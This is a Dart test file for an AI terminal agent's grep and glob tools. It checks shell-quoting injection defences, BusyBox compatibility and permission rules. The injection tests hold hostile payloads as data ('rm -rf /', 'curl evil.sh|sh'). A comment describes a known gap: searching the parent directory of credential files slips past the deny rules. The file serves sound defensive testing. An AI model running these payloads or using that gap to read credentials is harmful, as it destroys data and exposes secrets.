// grep / glob 两个搜索工具。
//
// 它们的 exec 命令**由我们拼**，模型只给 pattern 和 path —— 这是它们存在的
// 理由（把输出上限做进实现里），也是它们唯一的风险来源：拼字符串的地方少一个
// shellQuote，模型就能拿到任意命令执行，而且这条路绕过了元字符检测（检测的
// 对象是 checkTarget，不是 execCommand）。
//
// 所以这个文件里最重要的不是「功能对不对」，是注入那几条。
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';

import 'package:flyterm/ai/agent/agent_tools.dart';
import 'package:flyterm/ai/agent/permission_rules.dart';
import 'package:flyterm/ai/agent/tool_models.dart';
import 'package:flyterm/ai/agent/tool_partition.dart';
import 'package:flyterm/ai/agent/tool_registry.dart';

import '_fakes.dart';

AIResponse _call(String id, String name, Map<String, dynamic> args) =>
    AIResponse(toolCalls: [ToolCall(id: id, name: name, args: args)]);

/// 跑一次工具调用，返回实际打到远端的那条命令。
Future<String> _ranCommand(String name, Map<String, dynamic> args) async {
  final runner = FakeRunner();
  final loop = makeLoop(
    provider: FakeProvider([
      _call('c1', name, args),
      const AIResponse(text: 'done'),
    ]),
    runner: runner,
    // bypass 免掉审批，测试只关心命令长什么样。判定本身另有测试覆盖。
    mode: PermissionMode.bypass,
    // 必须显式给 full 档：makeLoop 默认是 leanToolSpecs，而 _executeOne
    // 开头那道闸门只受理当前档声明过的工具名 —— 不传的话这两个工具会被
    // 当成模型幻觉挡掉，runner 一条命令都收不到。
    toolSpecs: () => agentToolSpecsFor(AgentToolTier.full),
  );
  await loop.send('go');
  expect(runner.ran, isNotEmpty, reason: '工具没有执行任何命令');
  return runner.ran.first;
}

void main() {
  group('注入防护', () {
    test('pattern 里的分号与引号不能逃出引号', () async {
      // 这是最关键的一条：漏了 shellQuote，这个 pattern 就是任意执行。
      final cmd = await _ranCommand('grep', {
        'pattern': r"x'; rm -rf / #",
      });

      // 锁完整字符串，不用「不含某个形状」那种断言。
      //
      // 先前这里写的是 isNot(matches(RegExp(r"'\s*;\s*rm")))，它验证不了它
      // 声称的性质：转义后的串里确实有 `'; rm`，但那个引号是**开**引号，
      // 后面的 `; rm` 在引号内 —— 正则区分不了开闭引号，所以那条断言只是
      // 在描述一个恰好为真或恰好为假的巧合。
      //
      // 锁死整条命令的代价是改拼接格式就会红。那是想要的：这条命令的每个
      // 字节都是安全性质的一部分，改它就该有人看一眼。
      expect(
        cmd,
        "grep -rnHI -- 'x'\\''; rm -rf / #' '.' "
        '2>/dev/null | head -$kSearchResultLimit',
      );
    });

    test('转义在真实 shell 下确实是字面量', () async {
      // 上面那条锁的是「我们拼出了预期的字符串」，这条锁的是「那个字符串在
      // sh 眼里真的只是一个参数」—— 唯一能证明没有注入的方式是让 shell 自己
      // 解析一遍。少了它，只要预期值和实现一起写错，两边就会一致地错下去。
      const payload = r"x'; rm -rf / #";
      final cmd = await _ranCommand('grep', {'pattern': payload});

      // 把 grep 换成 printf，让它把收到的第一个参数原样打出来。替换的是
      // 命令名与选项，pattern 那一段仍是被测代码拼出来的原物。
      final probe = cmd
          .replaceFirst('grep -rnHI -- ', 'printf %s ')
          .replaceFirst(" '.' 2>/dev/null | head -$kSearchResultLimit", '');
      final r = await Process.run('sh', ['-c', probe]);

      expect(r.exitCode, 0);
      // 收到的就是原文，一个字节不多不少 —— 没有任何东西被 shell 解释掉。
      expect(r.stdout, payload);
    });

    test('path 里的注入同样被包住', () async {
      final cmd = await _ranCommand('glob', {
        'pattern': '*.conf',
        'path': r"/etc'; curl evil.sh|sh #",
      });

      expect(cmd, contains(r"'/etc'\''; curl evil.sh|sh #'"));
    });

    test('include 里的注入同样被包住', () async {
      final cmd = await _ranCommand('grep', {
        'pattern': 'error',
        'include': r"*.log'; id #",
      });

      expect(cmd, contains(r"-name '*.log'\''; id #'"));
    });
  });

  group('BusyBox 兼容', () {
    // 这一组的每条断言都在 busybox:1.38 上实测过，不是照 GNU man page 写的。
    // 项目里早有这个意识（file_edit.dart：`base64 -w0` 是 GNU 扩展，
    // BusyBox 没有），搜索工具没有理由例外 —— Alpine 容器是排查场景里的常客。
    test('不用 --include —— BusyBox grep 不认它，而错误会被静默吞掉', () async {
      // 实测：busybox grep 对 --include 报 `unrecognized option` 并失败。
      // 而命令带 2>/dev/null、又经过管道（退出码归 head），于是模型收到一个
      // 空结果，据此断言「没有匹配」。这是最坏的失败模式：安静地给出错答案。
      final cmd = await _ranCommand('grep', {
        'pattern': 'error',
        'include': '*.log',
      });

      expect(cmd, isNot(contains('--include')));
      // 换成 find 挑文件再喂给 grep，两条都是 POSIX。
      expect(cmd, contains("find '.' -type f -name '*.log' -print0"));
      expect(cmd, contains('xargs -0 -r grep -nHI --'));
    });

    test('带 -H —— 单个文件时 grep 默认不给文件名前缀', () async {
      // 实测：`grep -rn pattern ./a.log` 输出是裸的 `1:xxx`，没有文件名。
      // 而工具描述承诺的是 file:line。xargs 分支只喂进一个文件时同理。
      final one = await _ranCommand('grep', {
        'pattern': 'error',
        'path': '/var/log/syslog',
      });
      expect(one, contains('-rnHI'));

      final withInclude = await _ranCommand('grep', {
        'pattern': 'error',
        'include': '*.log',
      });
      expect(withInclude, contains('grep -nHI'));
    });

    test('xargs 带 -r —— 空输入时不跑一个无参 grep', () async {
      // 无参 grep 会去读 stdin。实测 BusyBox 下不会挂住（exit 123），但
      // SSH exec 的 stdin 未必立刻 EOF，赌它等于赌一次 20 秒超时。
      // BusyBox xargs 支持 -r，实测过。
      final cmd = await _ranCommand('grep', {
        'pattern': 'error',
        'include': '*.conf',
      });
      expect(cmd, contains('xargs -0 -r'));
    });

    test('find 用 -print0 配 xargs -0 —— 文件名含空格不炸', () async {
      final cmd = await _ranCommand('grep', {
        'pattern': 'error',
        'include': '*.conf',
      });
      expect(cmd, contains('-print0'));
    });

    test('glob 只用 POSIX 的 find —— 无 -I 无 --include 无 GNU 扩展', () async {
      final cmd = await _ranCommand('glob', {'pattern': '*.conf'});
      expect(cmd, contains('-name'));
      expect(cmd, contains('-type f'));
      expect(cmd, isNot(contains('--')));
    });
  });

  group('输出上限', () {
    test('grep 自带 head 上限', () async {
      final cmd = await _ranCommand('grep', {'pattern': 'error'});
      expect(cmd, contains('head -$kSearchResultLimit'));
    });

    test('glob 自带 head 上限', () async {
      final cmd = await _ranCommand('glob', {'pattern': '*.conf'});
      expect(cmd, contains('head -$kSearchResultLimit'));
    });
  });

  group('命令形状', () {
    test('grep 带 -I 跳过二进制文件', () async {
      // 收益比「防几 KiB 乱码」小得多，实测的两家行为是：
      //
      // - GNU：真跳过。不加 -I 时它也不把二进制内容写进 stdout，只在 stderr
      //   说一句 `binary file matches` —— -I 省掉的是那行噪音。
      // - BusyBox：静默忽略，二进制照样命中（内容在首个 NUL 处截断）。
      //
      // 留着是因为两家都不报错、GNU 上还有点用 —— 与 --include 那种直接
      // 失败的情况性质不同。
      final cmd = await _ranCommand('grep', {'pattern': 'error'});
      expect(cmd, contains('-rnHI'));
    });

    test('grep 用 -- 终止选项解析', () async {
      // pattern 以 - 开头时，没有 -- 会被 grep 当成自己的开关。
      final cmd = await _ranCommand('grep', {'pattern': '-v'});
      expect(cmd, contains("-- '-v'"));
    });

    test('glob 只找文件，不返回目录', () async {
      final cmd = await _ranCommand('glob', {'pattern': 'nginx*'});
      expect(cmd, contains('-type f'));
    });

    test('省略 path 时搜当前目录', () async {
      // 命令由 wrapForSsh 带着 cd 到 cwd 执行，所以 . 就是用户所在目录。
      final cmd = await _ranCommand('grep', {'pattern': 'error'});
      expect(cmd, contains("'.'"));
    });

    test('给了 path 就用它', () async {
      final cmd = await _ranCommand('grep', {
        'pattern': 'error',
        'path': '/var/log',
      });
      expect(cmd, contains("'/var/log'"));
    });

    test('没给 include 时走直接 grep，不绕 find', () async {
      // 绕 find 是为 include 过滤付的代价（多一个进程、多一层管道）。
      // 不需要过滤时不该付。
      final cmd = await _ranCommand('grep', {'pattern': 'error'});
      expect(cmd, startsWith('grep -rnHI'));
      expect(cmd, isNot(contains('find')));
      expect(cmd, isNot(contains('xargs')));
    });

    test('pattern 缺失时报参数错误，不执行任何命令', () async {
      final runner = FakeRunner();
      final loop = makeLoop(
        provider: FakeProvider([
          _call('c1', 'grep', {'path': '/var/log'}),
          const AIResponse(text: 'done'),
        ]),
        runner: runner,
        mode: PermissionMode.bypass,
      );
      await loop.send('go');

      expect(runner.ran, isEmpty);
    });
  });

  group('权限判定', () {
    // 判定统一走 `cat <path>`，与 read_file 同一口径。不这么做，这两个工具
    // 就成了「用户关掉 cat 规则后仍能读任意文件」的后门。
    test('关掉 cat 规则后，grep 也要弹审批', () {
      final noCat = PermissionRuleSet(
        defaultAllowRules
            .where((r) => r.pattern != 'cat *')
            .toList(),
      );
      final calls = [
        ToolCall(id: 'a', name: 'grep', args: {
          'pattern': 'error',
          'path': '/var/log',
        }),
      ];

      final p = partitionToolCalls(calls,
          rules: noCat, mode: PermissionMode.ask, cwd: '/tmp');

      // 落进串行桶 = 要走审批，而不是自动放行。
      expect(p.parallel, isEmpty);
      expect(p.serial, [0]);
    });

    test('命中 deny 模式的路径要弹审批', () {
      final calls = [
        ToolCall(id: 'a', name: 'grep', args: {
          'pattern': 'key',
          'path': '/root/.aws/credentials',
        }),
      ];

      final p = partitionToolCalls(calls,
          rules: const PermissionRuleSet(defaultAllowRules),
          mode: PermissionMode.ask,
          cwd: '/tmp');

      expect(p.parallel, isEmpty);
      expect(p.serial, [0]);
    });

    test('搜索凭据的父目录会自动放行 —— 与 bash 上的 grep 完全一致', () {
      // **这是一个既有缺口，不是这两个工具引入的。**
      //
      // deny 清单里多数模式是目录锚定的（`.aws/credentials`），而任何递归
      // 读取都能把 path 指向父目录来绕过锚点：checkTarget 是
      // `cat /root/.aws`，匹配不到 `.aws/credentials`，于是命中 `cat *`
      // 自动放行，而 grep -r 会把那个文件的内容读出来。
      //
      // 同一条路在 `bash` 上早就通的：`grep -rn key /root` 命中默认规则里的
      // `grep *`，一样自动放行。所以这里锁的是「没有引入新洞」，不是「这样
      // 是对的」。真要堵，得把 path 纳入 isSensitiveCwd 判定，而那要同时改
      // _executeCommandTool 与本文件的分桶（两边不一致会出现「分桶判需审批、
      // 执行判放行」），属于单独一件事。
      //
      // 这条测试的作用是：将来有人去堵那个洞时，它会失败，提醒把 bash 那条
      // 路一起堵上 —— 只堵工具不堵 bash 等于没堵。
      final viaTool = partitionToolCalls([
        ToolCall(id: 'a', name: 'grep', args: {
          'pattern': 'key',
          'path': '/root/.aws',
        }),
      ], rules: const PermissionRuleSet(defaultAllowRules),
          mode: PermissionMode.ask, cwd: '/tmp');

      final viaBash = partitionToolCalls([
        ToolCall(id: 'b', name: 'bash', args: {
          'command': 'grep -rn key /root/.aws',
          'description': 'x',
        }),
      ], rules: const PermissionRuleSet(defaultAllowRules),
          mode: PermissionMode.ask, cwd: '/tmp');

      // 两条路的判定必须一致。工具比 bash 更宽松才是真正的新洞。
      expect(viaTool.parallel, viaBash.parallel);
    });

    test('执行目录落在凭据目录里时，搜索照样弹审批', () {
      // isSensitiveCwd 那一条仍然生效：用户 cd 到 ~/.aws 之后，这两个工具
      // 和其他一切命令一样要用户点一下。
      final calls = [
        ToolCall(id: 'a', name: 'glob', args: {'pattern': '*'}),
      ];

      final p = partitionToolCalls(calls,
          rules: const PermissionRuleSet(defaultAllowRules),
          mode: PermissionMode.ask,
          cwd: '/root/.aws');

      expect(p.parallel, isEmpty);
    });

    test('默认规则下的普通搜索进并行桶', () {
      // 「在哪个文件里」和「哪些文件叫这个名字」互不影响，同一轮问三处正是
      // 它们最典型的用法 —— 串行执行等于白付三次网络往返。
      final calls = [
        ToolCall(id: 'a', name: 'grep', args: {
          'pattern': 'error',
          'path': '/var/log',
        }),
        ToolCall(id: 'b', name: 'glob', args: {
          'pattern': '*.conf',
          'path': '/etc',
        }),
      ];

      final p = partitionToolCalls(calls,
          rules: const PermissionRuleSet(defaultAllowRules),
          mode: PermissionMode.ask,
          cwd: '/tmp');

      expect(p.parallel, [0, 1]);
      expect(p.serial, isEmpty);
    });

    test('省略 path 时的分桶判定与执行侧同源', () {
      // 分桶判 `cat .`、执行判别的，会出现「分桶时判成需审批、执行时判成
      // 放行」这种两边不一致。
      final calls = [
        ToolCall(id: 'a', name: 'grep', args: {'pattern': 'error'}),
      ];

      final p = partitionToolCalls(calls,
          rules: const PermissionRuleSet(defaultAllowRules),
          mode: PermissionMode.ask,
          cwd: '/tmp');

      expect(p.parallel, [0]);
    });
  });

  group('分档', () {
    test('full 档有这两个工具', () {
      final names = agentToolSpecsFor(AgentToolTier.full).map((t) => t.name);
      expect(names, containsAll(['grep', 'glob']));
    });

    test('lean 档没有 —— bash 拼 grep 在小模型上也能工作', () {
      final names = agentToolSpecsFor(AgentToolTier.lean).map((t) => t.name);
      expect(names, isNot(contains('grep')));
      expect(names, isNot(contains('glob')));
    });

    test('lean 档下即便模型硬调也执行不了 —— 闸门真的在拦', () async {
      // 分档不只是 prompt 里少说几句：_executeOne 开头那道闸门只受理当前
      // 档声明过的工具名。少了它，模型幻觉出一个没给它的工具名就会真的执行。
      final runner = FakeRunner();
      final loop = makeLoop(
        provider: FakeProvider([
          _call('c1', 'grep', {'pattern': 'error', 'path': '/var/log'}),
          const AIResponse(text: 'done'),
        ]),
        runner: runner,
        mode: PermissionMode.bypass,
        // 不传 toolSpecs = lean 档
      );
      await loop.send('go');

      expect(runner.ran, isEmpty);
    });
  });
}
